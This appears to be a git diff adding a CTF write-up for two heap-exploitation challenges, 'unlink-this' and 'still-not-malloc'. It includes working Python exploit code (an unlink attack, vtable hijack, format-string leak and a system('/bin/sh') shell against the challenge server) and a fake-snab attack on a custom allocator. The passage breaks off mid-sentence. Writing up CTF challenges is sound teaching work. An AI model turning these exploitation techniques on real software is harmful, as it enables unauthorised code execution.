@@ -5,7 +5,7 @@ category: writeups
 excerpt: Writeups for unlink-this and still-not-malloc
 tags:
   - pwn
-draft: true
+draft: false
 ---
 import Challenge from "@components/Challenge.vue";
 
@@ -232,7 +232,7 @@ field has a constant size of 0x100. It's important to note that the length of
 copy into the struct is calculated by `strlen{:c}`, so we cannot put any null
 bytes in our overflow, which will be quite troublesome later on.
 
-In the sign function, we interface with the `crypto{:c}` vtable that
+In the sign function, we interface with the `crypto{:c}` vtable that was
 pre-initialized. The functions in the vtable don't do much, so it's immediately
 obvious that this function will be used for RCE by controlling the fields in the
 vtable.
@@ -267,9 +267,252 @@ linked list and freed. We can allocate up to 10 nodes at a time.
 
 ## Write primitive
 
-Unlike libc's malloc, chunks in jemalloc don't hold metadata. Instead, metadata
+Unlike libc's ptmalloc, chunks in jemalloc don't hold metadata. Instead, metadata
 is stored in a header section of an arena. The heap overflow thus isn't as
 useful as it would be in ptmalloc.
+
+So, the heap overflow can only be used to attack an allocated `some_thing{:c}`.
+Most useful to attack is the next/prev pointers. With this, we can do the usual
+unlink attack, which will write prev to `next->prev{:c}` and next to
+`prev->next{:c}`. Because of the nature of this write, our desired write value
+must also be a writable region. 
+
+## PIE/Heap leak
+
+To do the above, we need to get a heap leak first. We can do so by using the
+overflow to overwrite the `challenge_len{:c}` of a `some_thing{:c}`, allowing an
+OOB read past the victim object.
+
+We first allocate 3 objects adjacent to each other, free attacker, and allocate
+it again to perform the overflow onto victim. Note that we need padding 1 so
+that we can restore its prev pointer after the overflow, by unlinking padding 1.
+
+```py
+# memory layout:
+# padding_1
+# attacker
+# victim
+# leak 
+
+# get heap leak
+padding_1 = create(0x10, b"asdf")
+attacker = create(0x10, b"asdf")
+victim = create(0x10, b"asdf")
+# padding_1 -> attacker -> victim
+
+sign(attacker)
+# padding_1 -> victim
+
+payload = b"a"*0x120
+payload += b"a"*0x8
+payload += b"a"*0x8
+payload += p64(0xffffffffffffffff)
+payload += p64(0xfff)
+
+victim = 0xffffffff
+
+# will corrupt victim->prev, need to fix this
+attacker = create(len(payload), payload)
+# padding_1 -> victim -> attacker
+
+# restore prev
+sign(padding_1)
+# victim -> attacker
+
+padding_1 = create(0x10, b"asdf")
+# victim -> attacker -> padding_1
+leak = create(0x10, b"asdf")
+# victim -> attacker -> padding_1 -> leak
+
+sign(victim)
+# attacker -> padding_1 -> leak
+```
+
+Now, signing victim will leak the next/prev pointers from leak. Helpfully, the
+prev pointer is our heap leak, and the next pointer which points to the list
+head is our PIE leak.
+
+## RIP control
+
+With these leaks, we are now ready to overwrite the crypto vtable. In the
+binary's writable region, there is a pointer to the crypto vtable. We wish to
+overwrite this pointer to instead point to our fake vtable.
+
+We can go ahead and try all the one_gadgets available for us, but we will find
+that none of them have valid constraints. No worries, we still have RIP control,
+let's try and control all the pointers in the crypto object to get full control
+over the program.
+
+But we have a small problem. Because of the way we write onto the heap, we can't
+place null bytes in our payload. We can only rely on the uninitialized null
+bytes to forge valid function pointers. As a result, of the 3 function pointers
+in the vtable, we can only forge 2 of them properly, using 2 writes. We must do
+this prudently to proceed.
+
+The sign function is where all 3 function pointers are called. To prevent a
+premature crash, we must choose our functions and gadgets wisely.
+
+```c
+void sign(){
+    puts("session id?");
+    int session_id = (int)get_number();
+    some_thing* thing = find_thing(session_id);
+    if(thing == NULL){
+        return;
+    }
+    char* sig_buf = crypto->allocate_sig();
+    crypto->sign(crypto, thing->challenge, thing->challenge_len, sig_buf); 
+    puts("challenge: ");
+    puts("=============================");
+    write(1, thing->challenge, thing->challenge_len);
+    puts("\n=============================");
+    puts("signature: ");
+    puts("=============================");
+    write(1, sig_buf, 0x100); 
+    puts("\n=============================");
+    unlinnk(thing);
+    free(thing);
+    nr_things--;
+    crypto->destroy_sig(sig_buf);
+}
+```
+
+If we consider that the unlink occurs in `sign{:c}`, then naturally the only 2
+valid choices are `destroy_sig{:c}` and `allocate_sig{:c}`, as these will be the
+next 2 function pointers to be referenced. However, it'd be useful for us to be
+able to overwrite `sign{:c}` as well, as it contains many arguments that we can
+partially control. We can overwrite `sign{:c}` later, right now our goal is to
+avoid crashing by calling it, so we will set `allocate_sig{:c}` to a simple ret
+gadget, and `destroy_sig{:c}` to the create function.
+
+```py
+# memory layout:
+# padding_1
+# attacker
+# victim
+# leak 
+# forge_before
+# forge_struct
+
+forge_before = create(0x10, b"before")
+forge_struct = create(0x8, p64(exe.sym.create)) # destroy_sig
+# attacker -> padding_1 -> leak -> victim -> forge_before -> forge_struct
+
+sign(forge_before)
+payload = b"a"*0x120
+payload += b"a"*0x8*0x3
+payload += p64(ret) # allocate_sig
+forge_before = create(len(payload), payload)
+forge_struct = 0x61616161
+# attacker -> padding_1 -> leak -> victim -> forge_struct -> forge_before
+
+sign(leak)
+# attacker -> padding_1 -> victim -> forge_struct -> forge_before
+payload = b"a"
+leak = create(len(payload), payload)
+# attacker -> padding_1 -> victim -> forge_struct -> forge_before -> leak
+
+sign(victim)
+payload = b"a"
+victim = create(len(payload), payload)
+# attacker -> padding_1 -> forge_struct -> forge_before -> leak -> victim
+
+fake_crypto = heap_leak + 0x660 - 0x18
+
+# overwrite prev of victim
+# so free padding_1 will set head_next to crypto
+sign(attacker)
+# padding_1 -> forge_struct -> forge_before -> leak -> victim
+payload = b"a"*0x120
+payload += b"a"*0x8
+payload += p64(crypto_ptr)
+attacker = create(len(payload), payload)
+# padding_1 -> forge_struct -> forge_before -> leak -> victim -> attacker
+```
+
+At this point, the victim object looks like this, and on unlinking it, it will
+write `next{:c}` (address of our fake vtable) to `prev->next{:c}` (crypto
+vtable). After calling `destroy_sig{:c}`, we will re-allocate victim and then
+return to the main function cleanly.
+
+```ansi
+[22;1;32mpwndbg> [22;39mx/8gx 0x7ffff701e280
+[34m0x7ffff701e280[39m:	0x00007ffff701e648	0x0000555555558070
+[34m0x7ffff701e290[39m:	0xffffffff3bdad7d7	0x0000000000000001
+[34m0x7ffff701e2a0[39m:	0x00006d6974636961	0x0000000000000000
+[34m0x7ffff701e2b0[39m:	0x0000000000000000	0x0000000000000000
+[22;1;32mpwndbg> [22;39mtel 0x00007ffff701e648
+00:0000│  [35m0x7ffff701e648[39m —▸ [35m0x555555558060 (head_next)[39m —▸ [35m0x7ffff701e640[39m —▸ [35m0x7ffff701e500[39m —▸ [35m0x7ffff701e3c0[39m ◂— ...
+01:0008│  [35m0x7ffff701e650[39m ◂— 0x6161616161616161 ('aaaaaaaa')
+02:0010│  [35m0x7ffff701e658[39m —▸ [31m0x55555555501a (_init+26)[39m ◂— [38:5:148mret[97m 
+[39m03:0018│  [35m0x7ffff701e660[39m —▸ [31m0x55555555546c (create)[39m ◂— [38:5:148mendbr64[97m 
+[39m04:0020│  [35m0x7ffff701e668[39m ◂— 0
+... ↓     3 skipped
+[22;1;32mpwndbg> [22;39mtel 0x0000555555558070
+00:0000│  [35m0x555555558070 (crypto)[39m —▸ [35m0x7ffff701d000[39m ◂— 8
+01:0008│  [35m0x555555558078[39m ◂— 0
+... ↓     6 skipped[m
+```
+
+## Libc leak and RCE
+
+As of now, forgebefore is unallocated, so we can re-allocate it to insert the
+fake pointer for `sign{:c}`. We have PIE leak, so a good function to set it to
+is the binary's printf. The first argument passed to `sign{:c}` is the crypto
+vtable itself, so we can easily control the format string passed to printf and
+get our libc leak.
+
+```py
+fake_sign = exe.sym.printf
+payload = b"a"*0x128
+payload += b"%13$p".ljust(8, b" ")
+payload += p64(fake_sign)
+forge_before = create(len(payload), payload)
+# leak -> attacker -> forge_before
+```
+
+Lastly, we can do the same thing as above, setting `sign{:c}` to system instead,
+and placing the /bin/sh string at the start of crypto. This will pop us a shell!
+
+```ansi
+[36m$[39m python3 solve.py       
+[39m[[22;1;34m*[22;39m] '/home/samuzora/ctf/current/lakectf/unlink-this/unlink-this/solve/unlink_patched'
+    Arch:       amd64-64-little
+    RELRO:      [32mFull RELRO
+[39m    Stack:      [32mCanary found
+[39m    NX:         [32mNX enabled
+[39m    PIE:        [32mPIE enabled
+[39m    SHSTK:      [32mEnabled
+[39m    IBT:        [32mEnabled
+[39m    Stripped:   [31mNo
+[39m    Debuginfo:  [31mYes
+[39m[[22;1;34m*[22;39m] '/home/samuzora/ctf/current/lakectf/unlink-this/unlink-this/solve/libs/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      [32mFull RELRO
+[39m    Stack:      [32mCanary found
+[39m    NX:         [32mNX enabled
+[39m    PIE:        [32mPIE enabled
+[39m    FORTIFY:    [32mEnabled
+[39m    SHSTK:      [32mEnabled
+[39m    IBT:        [32mEnabled
+[39m    Stripped:   [31mNo
+[39m    Debuginfo:  [31mYes
+[39m[[22;1;32m+[22;39m] Opening connection to chall.polygl0ts.ch on port 6666: Done
+0x55f284a4e060
+0x7f359361e000
+0x7f359361d000
+0x55f284a4a000
+0x7f3593edb000
+[[22;1;34m*[22;39m] Switching to interactive mode
+
+[22;1;31m$[22;39m ls
+flag
+run
+unlink
+[22;1;31m$[22;39m cat flag
+EPFL{1_sw34r_br0_0n3_m0r3_Unl1nk_1s_4ll_1_n33d}
+[22;1;31m$[22;39m [m
+```
 
 # still-not-malloc
 
@@ -280,3 +523,1209 @@ useful as it would be in ptmalloc.
 >
 so this year I wrote another terrible allocator whose sole purpose is to be pwned
 </Challenge>
+
+This challenge introduces a custom allocator alongside the regular libc
+ptmalloc. Below is the main code that we interact with. We can allocate, edit,
+and free chunks created by either allocator. There isn't a read function, which
+will make our leaks slightly more troublesome later on. There are 2 different
+arrays to keep track of chunks from each allocator.
+
+```c title="main.c"
+#define MAX_ALLOCS 0x1000
+#define MAX_ALLOC_SIZE ORDER_2_CHUNK_SZ(SNAB_MAX_ORDER) // 0x100
+
+enum { ALLOC = 0, EDIT = 1, FREE = 2, CMDS = 3 };
+enum { MALLOC = 1, SNALLOC = 2 };
+
+typedef struct {
+  char *buf;
+  size_t size;
+} alloc_t;
+
+static alloc_t mallocs[MAX_ALLOCS];
+static alloc_t snallocs[MAX_ALLOCS];
+
+#define MAX_BUF 0x100
+
+size_t readline(char *buf, size_t size) {
+  ssize_t r = 0;
+  size_t n = 0;
+  char c = 0;
+
+  while (n < size) {
+    r = read(STDIN_FILENO, &c, sizeof c);
+
+    if (r <= 0 || c == '\n') {
+      break;
+    }
+
+    buf[n++] = c;
+  }
+
+  return n;
+}
+
+size_t getnum(char *prompt) {
+  size_t n = 0;
+
+  printf("%s> ", prompt);
+
+  scanf("%zu", &n);
+
+  // clang-format off
+  while (getchar() != '\n');
+  // clang-format on
+
+  return n;
+}
+
+int ask_use_snalloc() {
+  size_t allocator = 0;
+
+  puts("\n1 - malloc\n2 - snalloc");
+  allocator = getnum("allocator");
+
+  return allocator == SNALLOC;
+}
+
+alloc_t *get_alloc(int is_snalloc, size_t idx) {
+  if (idx >= MAX_ALLOCS) {
+    return NULL;
+  }
+
+  if (is_snalloc) {
+    return &snallocs[idx];
+  }
+
+  if (!is_snalloc) {
+    return &mallocs[idx];
+  }
+
+  return NULL;
+}
+
+void do_cmd(size_t cmd) {
+  int is_snalloc = 0;
+  size_t idx = 0;
+  alloc_t *alloc = NULL;
+  size_t size = 0;
+
+  is_snalloc = ask_use_snalloc();
+
+  idx = getnum("idx");
+
+  alloc = get_alloc(is_snalloc, idx);
+
+  if (!alloc->buf && cmd != ALLOC) {
+    puts("empty chunk");
+    return;
+  }
+
+  switch (cmd) {
+
+  case ALLOC:
+    size = getnum("size");
+    if (size > MAX_ALLOC_SIZE) {
+      puts("size too big");
+      return;
+    }
+
+    if (is_snalloc) {
+      alloc->buf = snalloc(size);
+    } else {
+      alloc->buf = malloc(size);
+    }
+
+    if (!alloc->buf) {
+      perror("alloc");
+      return;
+    }
+
+    alloc->size = size;
+    return;
+
+  case EDIT:
+    printf("content> ");
+    readline(alloc->buf, alloc->size);
+    return;
+
+  case FREE:
+    if (is_snalloc) {
+      snfree(alloc->buf);
+    } else {
+      free(alloc->buf);
+    }
+
+    alloc->buf = NULL;
+    alloc->size = 0;
+    return;
+
+  default:
+    return;
+  }
+}
+
+int main(int argc, char *argv[]) {
+  size_t cmd = 0;
+
+  setbuf(stdin, NULL);
+  setbuf(stdout, NULL);
+  setbuf(stderr, NULL);
+
+  puts(banner);
+
+  while (1) {
+    puts("\n1 - alloc\n2 - edit\n3 - free");
+
+    cmd = getnum("cmd") - 1;
+    if (cmd >= CMDS) {
+      _exit(ERR_CODE);
+    }
+
+    do_cmd(cmd);
+  }
+}
+```
+
+## The snalloc allocator
+
+Important types and macros are defined in `snalloc.h`. 
+
+```c title="snalloc.h"
+#define SNAB_AUTO 1
+#define SNAB_EXTEND 2
+
+#define SNAB_MAX_ORDER 3
+#define SNAB_CHUNKS (8 * sizeof(bitmap_t))
+
+#define PAGE 0x1000
+
+/* 1 + order pages for data */
+#define ORDER_2_SNAB_SZ(order) (((order) + 2) * PAGE)
+
+/* each snab contains SNAB_CHUNKS chunks, chunk size is determined by order */
+#define ORDER_2_CHUNK_SZ(order) ((ORDER_2_SNAB_SZ(order) - PAGE) / SNAB_CHUNKS)
+
+/* minimum order to allocate a chunk of size chunk_sz */
+#define CHUNK_SZ_2_ORDER(chunk_sz)                                             \
+  ((chunk_sz) ? ((chunk_sz) * SNAB_CHUNKS - 1) / PAGE : 0)
+
+/* used to identify snab metadata page */
+#define SNAB_MAGIC(snab) (((uint64_t)(snab)) >> 12)
+
+typedef struct snab_t {
+  magic_t magic;
+  uint64_t flags;
+  order_t order;
+  bitmap_t bitmap;
+  struct snab_t *prev;
+  struct snab_t *next;
+} snab_t;
+```
+
+Importantly, we see the `snab_t{:c}` struct. The struct holds the metadata for
+a snab. The chunks of a snab are stored in the next page following the metadata.
+Let's look at how the allocation logic works.
+
+```c title="snalloc.c"
+#define MAX_SNABS 0x10
+snab_t *snabs[SNAB_MAX_ORDER + 1] = {NULL};
+size_t snab_count = 0;
+
+void *snalloc(size_t size) {
+  order_t order = CHUNK_SZ_2_ORDER(size);
+  snab_t *snab = NULL;
+  void *chunk = NULL;
+
+  while (!chunk && order <= SNAB_MAX_ORDER) {
+    snab = get_snab_from_order(order);
+    chunk = snab_free_chunk_get(snab);
+    ++order;
+  }
+
+  if (!chunk) {
+    errno = ENOMEM;
+  }
+
+  return chunk;
+}
+
+snab_t *get_snab_from_order(order_t order) {
+  snab_t *snab = snabs[order];
+
+  if (!snab) {
+    snab = snab_alloc(order, SNAB_EXTEND, NULL);
+    snabs[order] = snab;
+  }
+
+  return snab;
+}
+
+// create and populate new snab
+snab_t *snab_alloc(order_t order, size_t flags, snab_t *prev) {
+  snab_t *snab = NULL;
+
+  if (order > SNAB_MAX_ORDER) {
+    return NULL;
+  }
+
+  snab = _snab_malloc(order, flags);
+
+  if (snab) {
+    snab->magic = SNAB_MAGIC(snab);
+    snab->flags = flags;
+    snab->order = order;
+    snab->bitmap = 0x0;
+    snab->prev = prev;
+    snab->next = NULL;
+  }
+
+  return snab;
+}
+
+// claim new snab from allocator
+snab_t *_snab_malloc(order_t order, uint64_t flags) {
+  snab_t *snab = NULL;
+
+  LOG_DEBUG("order: %#zx, flags: %#zx, size: %#zx\n", order, flags,
+            ORDER_2_SNAB_SZ(order));
+
+  if (posix_memalign((void **)&snab, PAGE, ORDER_2_SNAB_SZ(order))) {
+    return NULL;
+  }
+
+  LOG_DEBUG("snab: %p\n", snab);
+
+  return (snab_t *)snab;
+}
+
+// find first free chunk in snab
+void *snab_free_chunk_get(snab_t *snab) {
+  void *chunk = NULL;
+
+  LOG_DEBUG("snab: %p, bitmap: %#zx\n", snab, snab->bitmap);
+
+  for (size_t i = 0; i < SNAB_CHUNKS; ++i) {
+    if (!((snab->bitmap >> i) & 1)) {
+      LOG_DEBUG("free at chunk at %#zx\n", i);
+      chunk = (char *)snab + PAGE + ORDER_2_CHUNK_SZ(snab->order) * i;
+      LOG_DEBUG("chunk: %p\n", chunk);
+      snab->bitmap |= (((bitmap_t)1) << i);
+      return chunk;
+    }
+  }
+
+  if (!snab->next && (snab->flags & SNAB_EXTEND) && snab_count < MAX_SNABS) {
+    snab->next = snab_alloc(snab->order, snab->flags | SNAB_AUTO, snab);
+    ++snab_count;
+  }
+
+  if (snab->next) {
+    return snab_free_chunk_get(snab->next);
+  }
+
+  return NULL;
+}
+
+/* get index of chunk inside snab */
+size_t snab_chunk_idx_get(snab_t *snab, void *chunk) {
+  size_t diff = (size_t)chunk - (size_t)snab - PAGE;
+  size_t idx = diff / ORDER_2_CHUNK_SZ(snab->order);
+
+  LOG_DEBUG("diff: %#zx, idx: %#zx\n", diff, idx);
+
+  if (idx < SNAB_CHUNKS) {
+    return idx;
+  }
+
+  fprintf(stderr, "%s: snab or chunk corrupted (idx)\n", __func__);
+  _exit(1);
+}
+```
+
+`snalloc{:c}` is the function we can interface with. It determines the
+appropriate snab order for a request, based on the macro logic defined in the
+header file. The correspondence is as follows:
+
+```
+ snab order | chunk size
+------------|------------
+        0x0 | 0x40
+        0x1 | 0x80
+        0x2 | 0xc0
+        0x3 | 0x100
+```
+
+Note that if a request in-between sizes is made, the smallest possible order
+snab will be used to service it (ie. 0x30 shall be serviced by 0x40, 0xb0 by
+0xc0 and so on).
+
+This is the flow of allocating a chunk:
+
+**get_snab_from_order**
+
+Return the linked list of snabs for the requested order. If it doesn't yet
+exist, create the first snab via `snab_alloc{:c}`. A snab is guaranteed to be
+page-aligned; if not, as per `posix_memalign{:c}`, the remainder chunk will be
+split accordingly into a free chunk and the service chunk. The function is not
+expected to return NULL, but it can happen if `posix_memalign{:c}` fails to
+allocate a snab, in which case the program will crash in
+`snab_free_chunk_get{:c}`.
+
+**snab_free_chunk_get**
+
+Return the first free chunk in the linked list of snabs. Starts from the head
+and checks its bitmap, returning the index of the first bit that is set to 0. If
+not found, recurses down the linked list, creating new snabs if necessary (the
+parent snab must have `SNAB_EXTEND{:c}` set and the number of snabs allocated
+globally via this path must not be more than 0x10. If no chunk is available for
+this order, the next order will be used, up to order 3.
+
+In allocation, no checks are done to ensure the validity of the victim snab and
+the chunk carved from such a snab.
+
+Now let's look at freeing:
+
+```c title="snalloc.c"
+void snfree(void *chunk) {
+  snab_t *snab = NULL;
+
+  snab = get_snab_from_chunk(chunk);
+
+  _snfree(snab, chunk);
+}
+
+// determine the snab of a given chunk
+snab_t *get_snab_from_chunk(void *chunk) {
+  snab_t *snab = (snab_t *)((size_t)chunk & ~(PAGE - 1));
+  void *snab_min = (char *)snab + PAGE - ORDER_2_SNAB_SZ(SNAB_MAX_ORDER);
+
+  LOG_DEBUG("chunk: %p, page: %p, min_snab: %p\n", chunk, snab, snab_min);
+
+  LOG_DEBUG("page: %p, magic: %#zx\n", snab, SNAB_MAGIC(snab));
+
+  while ((snab->magic != SNAB_MAGIC(snab)) && ((void *)snab >= snab_min)) {
+    snab = (snab_t *)((char *)snab - PAGE);
+    LOG_DEBUG("page: %p, magic: %#zx\n", snab, SNAB_MAGIC(snab));
+  }
+
+  if ((void *)snab < snab_min) {
+    fprintf(stderr, "%s: snab or chunk corrupted (magic)\n", __func__);
+    _exit(1);
+  }
+  LOG_DEBUG("snab: %p\n", snab);
+
+  check_snab(snab);
+
+  check_snab_chunk(snab, chunk);
+
+  return snab;
+}
+
+// main free logic
+void _snfree(snab_t *snab, void *chunk) {
+  size_t idx = 0;
+  snab_t *prev = snab->prev;
+  snab_t *next = snab->next;
+
+  LOG_DEBUG("snab %p, chunk %p, slab->prev %p, slab->next %p\n", snab, chunk,
+            prev, next);
+
+  idx = snab_chunk_idx_get(snab, chunk);
+
+  if (!((snab->bitmap >> idx) & 1)) {
+    fprintf(stderr, "%s: snab double free (idx)\n", __func__);
+    _exit(1);
+  }
+
+  snab->bitmap &= ~(1ULL << idx);
+
+  if (snab->bitmap || !(snab->flags & SNAB_AUTO)) {
+    return;
+  }
+
+  if (next) {
+    next->prev = prev;
+  }
+
+  if (prev) {
+    prev->next = next;
+  }
+
+  memset(snab, 0, sizeof *snab);
+  free(snab);
+  --snab_count;
+}
+
+// check chunk index validity
+void check_snab_chunk(snab_t *snab, void *chunk) {
+  snab_chunk_idx_get(snab, chunk);
+}
+
+// check snab validity
+void check_snab(snab_t *snab) {
+  snab_t *prev = snab->prev;
+  snab_t *next = snab->next;
+
+  if (prev && snab != prev->next) {
+    fprintf(stderr, "%s: snab corrupted (prev)\n", __func__);
+    _exit(1);
+  }
+
+  if (next && snab != next->prev) {
+    fprintf(stderr, "%s: snab corrupted (prev)\n", __func__);
+    _exit(1);
+  }
+}
+```
+
+Given a chunk address, the allocator attempts to find the snab it belongs to. It
+uses a magic value that depends on the randomness of the heap base to identify a
+`snab_t{:c}`, which is secure based on the assumption that an attacker will not
+know this base without another primitive.
+
+After finding the snab, the allocator first checks if the identified metadata is
+further than the maximum allowed (the order-3 snab will have its metadata
+further up away from a chunk, so it is used in `snab_min{:c}`).
+
+In `_snfree{:c}`, the allocator gets ready to free the chunk and possibly the
+snab if conditions are correct. It first gets the index of the victim chunk, and
+ensures this index is no larger than 63. Next, if the current snab is part of a
+linked list, it checks the prev and next pointers to ensure that the list is not
+corrupted. Lastly, it checks if the index is already freed according to the
+bitmap, which probably indicates a double-free.
+
+## Vulnerability
+
+The vulnerability here lies in how the allocator detects a snab metadata chunk.
+Because it doesn't know how far away the metadata is from the chunk, it relies
+on the presence of the magic bytes at a page-aligned address to detect such a
+chunk. Fortunately for us, the magic bytes is calculated as such:
+
+```
+addr << 12
+```
+
+This happens to be the same as the pointer mangling for tcache/fastbin fd
+pointers. Therefore, even without a heap leak, we can still forge a fake snab,
+and do some nasty things from there.
+
+## Initial feng shui
+
+Note that the libc version is 2.42, where some changes were made to how tcache
+works. [This article](https://www.deep-kondah.com/glibc-heap-internals/) goes
+more in-depth into the changes made to tcache. Of concern to us is the new size
+of `tcache_perthread_struct{:c}`, which has increased to 0x300, and the new
+range of tcache sizes (basically any size 0x400000 can go into tcache now).
+Also, the struct is no longer allocated on heap setup, as we notice that
+allocating a slab won't create the struct, but allocating a regular chunk will.
+Anyway, it's not a very big deal for our feng shui, just something interesting
+to note.
+
+This is the state of the heap after we allocate a regular chunk.
+
+```ansi
+[22;1;32mpwndbg> [22;39mheap
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x555555579000
+[39mSize: 0x300 (with flag bits: 0x301)
+
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x555555579300
+[39mSize: 0x40 (with flag bits: 0x41)
+
+[31mTop chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x555555579340
+[39mSize: 0x20cc0 (with flag bits: 0x20cc1)[m
+```
+
+Our goal is to put an encrypted fd pointer at a page-aligned address that will
+be our fake snab magic. This fake snab must occur after a real snab, because the
+snab-searching logic searches upwards in memory. Therefore, we need to align our
+top chunk to a page, allocate 0x1000 bytes of space (for the real snab) as
+mallocs, then allocate the attacker chunk that we'll use to write the fd
+pointer. All these chunks must also belong to fastbin and not tcache, because
+tcache chunks won't be consolidated and will prevent the snab from reclaiming
+the memory.
+
+Let's first create the padding to align the top chunk to a page. The reason for
+using such sizes is so we can reuse these chunks to fill up tcache later.
+
+```py
+# to fill up tcache later on
+for i in range(0x7):
+    alloc(i, 0x30)
+
+for i in range(0x7, 0x7+0xb):
+    alloc(i, 0xf0)
+
+alloc(0x7+0xb, 0x20)
+```
+
+This results in the following heap state:
+
+```ansi
+[22;1;32mpwndbg> [22;39mheap
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x555555579000
+[39mSize: 0x300 (with flag bits: 0x301)
+
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x555555579300
+[39mSize: 0x40 (with flag bits: 0x41)
+
+...
+
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x555555579480
+[39mSize: 0x40 (with flag bits: 0x41)
+
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x5555555794c0
+[39mSize: 0x100 (with flag bits: 0x101)
+
+...
+
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x555555579ec0
+[39mSize: 0x100 (with flag bits: 0x101)
+
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x555555579fc0
+[39mSize: 0x30 (with flag bits: 0x31)
+
+[31mTop chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x555555579ff0
+[39mSize: 0x20010 (with flag bits: 0x20011)[m
+```
+
+Our real snab will be at this address later. For now, we allocate mallocs over
+it, followed by the chunk that will produce the fake snab. We should also write
+some of the necessary fields for the fake snab.
+
+```py
+# this is the start of the victim snab - fill up another 0x2000
+# 0x20 * 0x100
+# 0x7+0xb+0x1 = 0x14
+for i in range(0x14, 0x14+0x20):
+    alloc(i, 0xf0)
+
+# here we place a fake snab header
+# the chunk will leave the magic value in memory when freed to fastbin
+alloc(0x34, 0x30)
+
+# also control order and bitmap
+payload = flat(
+    0x0,
+    0x1, # flags
+    0x1, # order
+    0x1, # bitmap
+)
+edit(0x34, payload)
+```
+
+This is what the fake snab header looks like before we write the magic value:
+
+```ansi
+[22;1;32mpwndbg> [22;39mx/10gx 0x55555557bff0
+[34m0x55555557bff0[39m:	0x0000000000000000	0x0000000000000041
+[34m0x55555557c000[39m:	0x0000000000000000	0x0000000000000001
+[34m0x55555557c010[39m:	0x0000000000000001	0x0000000000000001
+[34m0x55555557c020[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557c030[39m:	0x0000000000000000	0x000000000001dfd1[m
+```
+
+After filling up the tcache and freeing the fastbin chunks, including the header
+chunk, like so:
+
+```py
+# fill up tcache for 0x30
+for i in range(0x7):
+    free(i)
+
+# fill up tcache for 0x100
+for i in range(0x7, 0x7+7):
+    free(i)
+
+# and free the rest of the snab allocation
+# including the fake header chunk
+for i in range(0x14, 0x35):
+    free(i)
+```
+
+This is the state of the fake snab:
+
+```ansi
+[22;1;32mpwndbg> [22;39mx/10gx 0x55555557bff0
+[34m0x55555557bff0[39m:	0x0000000000002000	0x0000000000000040
+[34m0x55555557c000[39m:	0x000000055555557c	0x0000000000000001
+[34m0x55555557c010[39m:	0x0000000000000001	0x0000000000000001
+[34m0x55555557c020[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557c030[39m:	0x0000000000000000	0x000000000001dfd1[m
+[22;1;32mpwndbg> [22;39mp *(snab_t *)0x55555557c000
+[36m$1[39m = {
+  [36mmagic[39m = 22906492284,
+  [36mflags[39m = 1,
+  [36morder[39m = 1,
+  [36mbitmap[39m = 1,
+  [36mprev[39m = [34m0x0[39m,
+  [36mnext[39m = [34m0x0
+[39m}[m
+```
+
+The magic value is nicely written there, along with the other fields! This is
+our fake snab.
+
+## Fake snab
+
+Now we can begin to exploit the fake snab. Firstly, we need to actually create a
+real snab that has chunks that will reference the fake snab. This is easy - just
+spray chunks until the allocation passes by our fake snab.
+
+```py
+# we need an order 2 page
+# fill up all chunks in this page until fake snab at +0x2000
+# 0x2000 = 0x100 * 0x20
+for i in range(0x21):
+    snalloc(i, 0x100)
+```
+
+Now, let's think about the fake snab primitive. We don't have any leaks, so we
+can't really edit the next pointer to point to another fake snab. Actually, we
+can't really do anything very serious with just snalloc alone! However, we can
+rely on ptmalloc for this - since ptmalloc is the backing allocator for
+snalloc's snabs, when a snab has no more allocated chunks and is freed, it will
+be freed back to ptmalloc. The fake snab primitive then becomes more like a
+invalid free primitive, which will be useful for us!
+
+Before we can do all that, we need to forge the chunk size for the fake snab as
+well, so that it can be freed properly. The chunk size is the number of bytes to
+the top chunk.
+
+```py
+# edit size field for chunk of fake snab
+payload = flat(
+    0x0, 0x3011
+)
+payload = b"\x00" * (0x100 - len(payload)) + payload
+snedit(0x0f, payload)
+```
+
+Now this is the state of the fake snab:
+
+```ansi
+[22;1;32mpwndbg> [22;39mx/10gx 0x555555579ff0+0x2000
+[34m0x55555557bff0[39m:	0x0000000000000000	0x0000000000003011
+[34m0x55555557c000[39m:	0x000000055555557c	0x0000000000000001
+[34m0x55555557c010[39m:	0x0000000000000001	0x0000000000000001
+[34m0x55555557c020[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557c030[39m:	0x0000000000000000	0x000000000001dfd1[m
+```
+
+It looks legit, so free should have no problem freeing this fake chunk. In order
+to trigger the ptmalloc free, we must free the snalloc chunk that lies exactly
+1 page below this metadata, which corresponds to index 0 in our fake snab. In
+our real snab, that's at index 0x20. After freeing it, the snalloc allocator
+will see that its bitmap is empty and it has the `SNAB_AUTO{:c}` flag set, which
+triggers the ptmalloc free and causes the top chunk to coalesce into it.
+
+```ansi
+[22;1;32mpwndbg> [22;39mx/10gx 0x555555579ff0+0x2000
+[34m0x55555557bff0[39m:	0x0000000000000000	0x000000000001e011
+[34m0x55555557c000[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557c010[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557c020[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555557c030[39m:	0x0000000000000000	0x000000000001dfd1[m
+```
+
+## Overlapping snabs
+
+At this point, we have a partially freed snab (let's call it snab 1). If we were
+to allocate a new snab, the new snab's metadata would overlap with
+`snalloc[0x10]{:c}`, a snalloc chunk belonging to snab 1. Let's call it snab 2.
+
+This primitive will be quite useful, as we can now control the order and bitmap
+of snab 2 by editing `snalloc[0x10]{:c}`. When allocating a snalloc chunk, the
+logic used is as follows:
+
+```c
+chunk = (char *)snab + PAGE + ORDER_2_CHUNK_SZ(snab->order) * i;
+
+offset = 0x1000 + (((order + 1) * 0x1000) / 64) * idx
+order  = (((offset - 0x1000) / idx) * 64) / 0x1000 - 1
+```
+
+By controlling order and idx, we can control the offset from the snab which we
